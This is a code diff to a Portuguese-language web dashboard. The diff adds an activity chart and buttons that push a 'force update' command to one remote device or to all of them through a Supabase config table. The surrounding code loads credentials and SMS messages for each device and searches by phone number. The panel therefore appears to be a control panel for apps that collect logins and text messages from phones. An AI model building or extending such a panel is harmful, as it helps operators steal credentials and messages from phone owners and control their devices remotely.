@@ -462,6 +462,18 @@
     </div>
   </div>
 
+  <!-- Mini gráfico de actividade + botão push -->
+  <div style="display:grid;grid-template-columns:1fr auto;gap:12px;margin-bottom:24px;align-items:stretch">
+    <div style="background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:16px">
+      <div style="font-family:var(--mono);font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:12px">Actividade últimos 7 dias</div>
+      <div id="mini-chart" style="display:flex;align-items:flex-end;gap:4px;height:48px"></div>
+    </div>
+    <div style="background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:16px;display:flex;flex-direction:column;justify-content:center;gap:8px;min-width:160px">
+      <div style="font-family:var(--mono);font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:1px">Acções remotas</div>
+      <button onclick="forcarAtualizacaoTodos()" style="background:var(--surface2);border:1px solid var(--accent);color:var(--accent);font-family:var(--mono);font-size:11px;padding:8px 12px;border-radius:8px;cursor:pointer;transition:all 0.2s" onmouseover="this.style.background='rgba(124,58,237,0.1)'" onmouseout="this.style.background='var(--surface2)'">🔄 Forçar actualização</button>
+    </div>
+  </div>
+
   <div class="search-row">
     <input class="search-input" type="text" placeholder="Pesquisar por número, modelo, device_id..." oninput="filtrar(this.value)" id="search">
   </div>
@@ -684,6 +696,63 @@ function toggleSMS(deviceId) {
   if (ch) ch.style.transform = open ? '' : 'rotate(90deg)';
 }
 
+// ── MINI GRÁFICO DE ACTIVIDADE ────────────────────────────────────
+function renderMiniChart(dispositivos) {
+  const el = document.getElementById('mini-chart');
+  if (!el) return;
+  const dias = 7;
+  const hoje = new Date();
+  const counts = [];
+  for (let d = dias - 1; d >= 0; d--) {
+    const dia = new Date(hoje);
+    dia.setDate(dia.getDate() - d);
+    const count = dispositivos.filter(dev => {
+      if (!dev.ultimo_acesso) return false;
+      const dv = new Date(dev.ultimo_acesso);
+      return dv.getFullYear()===dia.getFullYear() && dv.getMonth()===dia.getMonth() && dv.getDate()===dia.getDate();
+    }).length;
+    counts.push({ count, dia });
+  }
+  const maxCount = Math.max(...counts.map(c => c.count), 1);
+  const labels = ['Dom','Seg','Ter','Qua','Qui','Sex','Sáb'];
+  el.innerHTML = counts.map(({count, dia}) => {
+    const pct = Math.max(4, Math.round((count / maxCount) * 100));
+    const isHoje = dia.toDateString() === hoje.toDateString();
+    const label = labels[dia.getDay()];
+    return `<div style="flex:1;display:flex;flex-direction:column;align-items:center;gap:4px">
+      <div style="font-family:var(--mono);font-size:9px;color:var(--muted)">${count||''}</div>
+      <div style="width:100%;background:${isHoje?'var(--accent)':'#1e293b'};border-radius:3px;height:${pct}%;min-height:4px;transition:height 0.4s" title="${count} activos"></div>
+      <div style="font-family:var(--mono);font-size:8px;color:${isHoje?'var(--accent)':'var(--muted)'}">${label}</div>
+    </div>`;
+  }).join('');
+}
+
+// ── FORÇAR ACTUALIZAÇÃO REMOTA ─────────────────────────────────────────
+async function forcarAtualizacao(deviceId) {
+  try {
+    const r = await fetch(SUPA_URL + "/rest/v1/config?device_id=eq." + deviceId, {
+      method: 'PATCH',
+      headers: {...headers, 'Prefer': 'return=minimal'},
+      body: JSON.stringify({ forcar_update: true })
+    });
+    if (r.ok) alert('✅ Comando enviado! O dispositivo vai actualizar na próxima vez que abrir o app.');
+    else alert('❌ Falhou: ' + r.status);
+  } catch(e) { alert('❌ Erro: ' + e.message); }
+}
+
+async function forcarAtualizacaoTodos() {
+  if (!confirm('Forçar actualização em TODOS os dispositivos?')) return;
+  try {
+    const r = await fetch(SUPA_URL + "/rest/v1/config", {
+      method: 'PATCH',
+      headers: {...headers, 'Prefer': 'return=minimal'},
+      body: JSON.stringify({ forcar_update: true })
+    });
+    if (r.ok) alert('✅ Comando enviado a todos os dispositivos!');
+    else alert('❌ Falhou: ' + r.status);
+  } catch(e) { alert('❌ Erro: ' + e.message); }
+}
+
 function filtrar(query) {
   const q = query.toLowerCase().trim();
   if (!q) {
@@ -752,6 +821,7 @@ async function carregarDados() {
     todasSMS = Array.isArray(d3) ? d3 : [];
 
     actualizarStats();
+    renderMiniChart(todosDispositivos);
     renderLista(todosDispositivos, todasCredenciais);
   } catch(e) {
     document.getElementById("lista").innerHTML = '<div class="empty">❌ Erro: ' + e.message + "</div>";
